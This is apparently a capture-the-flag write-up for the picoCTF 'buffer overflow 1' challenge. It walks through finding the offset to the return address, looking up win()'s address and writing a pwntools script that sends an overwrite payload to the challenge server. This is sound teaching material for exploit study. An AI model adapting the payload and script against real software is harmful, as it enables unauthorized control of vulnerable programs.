# buffer overflow 1
Just like buffer overflow 0 this is a simple buffer overflow, however, here we have to change the return address value to the address of `win()`.

We have a vulnable function:

```
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

which will directly input our input into a buffer of `BUFSIZE`, however, as we have learned since the program doesn't check the length of our buffer it will just continue to write it onto the stack no matter what.

The first thing we have to do is find how much we have to input before we start overwriting the return pointer.
This is usually pretty easy to bruteforce by just inserting a long string of text, such as: `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT`

Inputting this into the program will give us:
`Okay, time to return... Fingers Crossed... Jumping to 0x4c4c4c4c`

So what is `0x4c` in ascii? Looking at any table will give us that it equals Uppercase L, meaning at after KKKK we start overwriting the return pointer.

The second step is to find the return address of the `win()` function. We can do this by using objdump on the provided binary.

`objdump -D vuln | grep win`

This will give us the address of: `0x080491f6`. However this is in little endian meaning that we need to swap each byte position.

Thus, by using pwntools, we can construct our payload: `payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK" + "\xf6\x91\x04\x08"
`.

Using this payload as input will then overwrite the return address with the `win()` function and provide us the flag.

Full program:
```
from pwn import *

host = "saturn.picoctf.net"
port = 63109

p = remote(host, port)

print(p.recvline())

# return addr for win: 0x080491f6
# little endian: f6910408

payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK" + "\xf6\x91\x04\x08"

p.sendline(payload)


print(p.recvline())

p.interactive()
```
